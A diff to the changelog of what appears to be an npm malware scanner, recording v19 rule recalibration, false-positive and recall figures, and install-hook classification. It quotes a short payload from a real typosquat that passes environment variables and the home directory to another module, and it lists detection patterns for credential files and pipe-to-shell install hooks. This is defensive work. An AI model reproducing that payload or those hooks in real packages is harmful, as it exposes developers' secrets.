@@ -503,6 +503,110 @@ essentially no new false positives, because Layers 0 and 1 had already accused n
 
 ---
 
+## v19 — capability model: false positives nearly halved at no recall cost
+
+Queue items **4 and 10** (2026-08-10). Items 7, 8, 9 remain open. All six arms re-run against
+`eval/baseline/v18/`; new snapshot at `eval/baseline/v19/`.
+
+| arm | recall v18 → v19 | any-finding FPR v18 → v19 | BLOCK-level FPR |
+|---|---|---|---|
+| A — 216,888 names, offline | 1.3% → 1.3% | 3.7% → 3.7% | 3.7% |
+| B — 65, live registry | 85.7% → **85.7%** | 66.7% → **46.7%** | **0.0%** |
+| C — 19 dummies | 16/16 pkgs, 15/16 vectors — unchanged | 0.0% | 0.0% |
+| D — 499 malicious, L1 | 88.8% → **87.6%** (floor 86.8%) | — | — |
+| E — 40 malicious, all layers | 97.5% → **97.5%** (floor 95.5%) | — | — |
+| F — 27 legitimate | — | 70.4% → **48.1%** | **0.0%** |
+
+Arm F clean packages went **8 → 14**; arm B **13 → 14**. Arm A is unchanged by construction — it is
+name-only, and a capability cluster needs findings the name checks never produce.
+
+### The measurement that drove it
+
+Per-check and per-sub-rule discrimination, arm D (499 real malicious, L1) vs arm F (27 legitimate,
+all layers). Only Layer 1 rows are comparable — **arm D never ran Layers 0/2/3**.
+
+| rule | malicious | benign | lift | action |
+|---|---|---|---|---|
+| `suspicious_strings` `os.homedir()` | 14.4% | **0.0%** | ∞ | keep SUSPECT |
+| `suspicious_strings` `/etc/passwd`,`/etc/shadow`,`~/.ssh` | 4.0/1.4/1.0% | **0.0%** | ∞ | keep BLOCK |
+| `obfuscation` atob / hex-ident / hex-seq | 9.4/6.2/1.6% | **0.0%** | ∞ | keep |
+| `shell_exfil` | 19.0% | 3.7% | 5.14 | keep |
+| `worm_signature` | 34.9% | 7.4% | 4.71 | keep |
+| `install_script` | 62.3% | 18.5% | 3.37 | **split by hook + body** |
+| `network_imports` | 38.1% | 14.8% | 2.57 | keep |
+| `obfuscation` long-base64 | 8.6% | 7.4% | 1.16 | **capability** |
+| `suspicious_strings` `process.env` | 36.3% | **44.4%** | **0.82** | **capability (inverted)** |
+| `dynamic_require` | 7.6% | **14.8%** | **0.51** | **capability (inverted)** |
+| `maintainer` (A3) | — | 11.1% | 0 TPs ever | **capability** |
+
+Two rules fire *more often on legitimate packages than on malware*. `process.env` alone reached 12
+of the 27 benign packages. Note the contrast **inside** `suspicious_strings`: its `os.homedir()`
+pattern is 14.4% vs 0.0% while its `process.env` pattern is inverted — the check was never broken,
+one of its five patterns was.
+
+### What changed
+
+**Capability tier.** The four non-discriminating rules now emit INFO with a `capability` key. A
+package carrying **≥3 distinct capabilities** gets a synthetic `capability_cluster` SUSPECT finding.
+Distinct *ids*, not findings — `obfuscation` and `suspicious_strings` emit one finding per file.
+
+It is emitted in `report::finish_scan`, which owns the four `CheckResult`s. `aggregate` only borrows
+them and returns a findings-less `RiskReport`, and the harness reads `classification` from
+`RiskReport.verdict` but `by_vector`/`sole_detector` from per-finding severity — so escalating the
+verdict alone would have moved the confusion matrix while leaving every per-vector metric flat.
+Verified: arm B `by_vector` META 0 → 5 fires.
+
+**`install_script`, from key-presence to hook-name + command-body.** It called
+`scripts.get(k).is_some()` and discarded the command, so `node-gyp rebuild` and `curl … | sh` were
+the same finding.
+
+| | malicious | benign |
+|---|---|---|
+| `preinstall` | 169 | **0** |
+| `postinstall` | 136 | 1 (`node-sass`) |
+| `install`/`prepare` only | 6 | 4 |
+| exec/exfil command shape | **79 packages** | **0** |
+| build-toolchain command shape | 9 hooks | 4 of 6 hooks |
+
+Exec shape → BLOCK; `pre`/`postinstall` → SUSPECT; `install`/`prepare` or a recognised build step →
+capability. B1 fires on the benign corpus went 5 → 1, and **arm D's BLOCK-level recall rose 21.6% →
+35.1%**. `node <file>` is deliberately not an exec shape: `node-sass` ships
+`"postinstall": "node scripts/build.js"` and most malicious hooks look the same.
+
+### `naniod` — the one loss, and why fixing the rule beat restoring the noise
+
+The demotions initially cost arm E exactly one package. `naniod` is a real `nanoid` typosquat whose
+entire payload is 239 bytes:
+
+```js
+var _ld = require('locale-loader-pro');
+_ld.configure && _ld.configure({ env: process.env, root: require('os').homedir() });
+```
+
+Its only accusation had been `process.env`. But it also calls **`require('os').homedir()`**, and the
+`os.homedir()` pattern only matched the bare form — a rule gap, not a calibration problem.
+`os.homedir` is 14.4% malicious vs 0.0% benign, so widening the pattern cost nothing and returned
+arm E to 97.5%. Restoring `process.env` as an accusation would have cost 12 legitimate packages to
+save this one.
+
+### Process failure: six arms measured against a stale binary
+
+The first v19 arm runs used a `--release` build that predated the `dynamic-require` capability tag,
+so that capability was demoted to INFO but never counted toward a cluster — the escalation was
+measured with 4 of 5 capabilities. It surfaced only because arm B's false-positive count moved
+between two runs that should have been identical, which initially looked like live-registry drift.
+All six arms were re-run. **Rebuild `--release` immediately before an arm run, and treat an
+unexplained delta between identical runs as a harness bug until proven otherwise.**
+
+### The ceiling
+
+48.1% is close to the static-only limit at this recall floor. The 13 still accused genuinely have
+the capability: `axios` imports http, `node-sass` runs a postinstall, `jquery`/`lodash`/`d3` ship
+minified `eval()`. Telling "has" from "abuses" needs a second evidence source, and Layer 2/3 reaches
+only 11/27 legitimate and 28/40 malicious packages. **That is a coverage problem** — items 7, 8, 9.
+
+---
+
 ## v18 — first fix pass, measured against the v17 baseline
 
 Queue items **0, 1, 2, 3, 5, 6** implemented (2026-08-04). Items 4, 7, 8, 9, 10 remain open. Arms
